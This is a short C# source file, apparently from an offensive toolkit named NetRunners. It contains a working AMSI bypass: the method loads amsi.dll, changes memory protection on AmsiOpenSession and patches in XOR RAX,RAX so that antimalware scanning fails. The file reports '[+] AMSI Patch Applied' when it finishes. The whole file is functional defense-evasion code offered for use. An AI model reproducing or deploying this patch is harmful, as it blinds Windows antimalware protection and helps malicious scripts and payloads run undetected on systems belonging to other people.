using System;
using System.Runtime.InteropServices;
using static NetRunners.DLLImports;


namespace NetRunners
{
    /// <summary>
    /// Contains Amsi bypass methods
    /// </summary>
    public static class Patchers
    {
        // patches AmsiOpenSession's first test instruction to xor, triggering conditional jump to invalid argument
        public static void AmsiOs()
        {
            // get amsi.dll pointer
            IntPtr Library = LoadLibrary("amsi.dll");
            // get amsiopensession pointer
            IntPtr funcAddress = GetProcAddress(Library, "AmsiOpenSession");
            uint p;
            // fix memory protections of amsiopensession
            VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out p);
            // use instructions XOR RAX,RAX
            Byte[] Patch = { 0x48, 0x31, 0xC0 };
            Marshal.Copy(Patch, 0, funcAddress, 3);
            // restore memory protection
            VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out p);
            Console.WriteLine("[+] AMSI Patch Applied");
        }
    }
}